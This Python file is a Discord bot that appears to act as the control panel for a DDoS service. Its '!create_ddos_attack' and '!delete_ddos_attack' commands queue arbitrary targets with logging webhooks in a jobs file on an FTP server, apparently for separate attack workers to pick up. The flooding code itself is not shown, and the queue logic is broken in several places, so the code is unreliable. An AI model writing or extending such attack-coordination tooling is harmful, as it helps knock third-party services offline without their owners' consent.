# github.com/b1bxonty
# ALL RIGHTS RESERVED
#

import io, os, json, ftplib, dotenv, discord
from discord.ext.commands import Bot, Context
dotenv.load_dotenv()

#get jobs from ftp server and save variable jobs
ftp = ftplib.FTP(os.getenv("ftp_host"))
ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))
#check if file exists
if "jobs.json" in ftp.nlst():
    #get file
    ftp.retrbinary("RETR jobs.json", open('jobs.json', 'wb').write)

    #load file
    with open('jobs.json') as f:
        jobs = json.load(f)
else:
    jobs = []

#close connection
ftp.quit()

def saveftp():
    #connect to ftp server
    ftp = ftplib.FTP(os.getenv("ftp_host"))
    ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))

    #if file exists, delete it
    if "jobs.json" in ftp.nlst():
        ftp.delete("jobs.json")

    #upload file
    ftp.storbinary('STOR jobs.json', io.BytesIO(json.dumps(jobs).encode('utf8')))

    #end delete file
    os.remove("jobs.json")

    #close connection
    ftp.quit()
###############################################################################################
intents = discord.Intents.all()
bot = Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
@bot.command(name='create_ddos_attack', help='Creates a new DDOS attack. Usage: !create_ddos_attack <target>')
async def create_ddos_attack(ctx : Context, target):
    #check every value in jobs, if target not there then add it
    for job in jobs:
        if job["target"] == target:
            await ctx.reply("Target already exists in the queue.")
            return
        
    
        if not discord.utils.get(ctx.guild.categories, name="DDOS Attacks"):
            await ctx.guild.create_category("DDOS Attacks")
        #create channel
        channel = await ctx.guild.create_text_channel(target, category=discord.utils.get(ctx.guild.categories, name="DDOS Attacks"))
        #create webhook and get url
        webhook = await channel.create_webhook(name="DDOS Attack")

        #add target to jobs
        jobs.append({
            "target": target, #for attack
            "webhook": webhook.url #for send logs
        })

        saveftp()

        await ctx.reply()

@bot.command(name='delete_ddos_attack', help='Deletes a DDOS attack. Usage: !delete_ddos_attack <target>')
async def delete_ddos_attack(ctx : Context, target):
    #check every value in jobs, if target not there then add it
    try:
        jobs.remove(target)
        saveftp()
        return await ctx.reply("Target removed from the queue.")
    except:
        return await ctx.reply("Target not found in the queue.")


bot.run(os.getenv('discord_token'))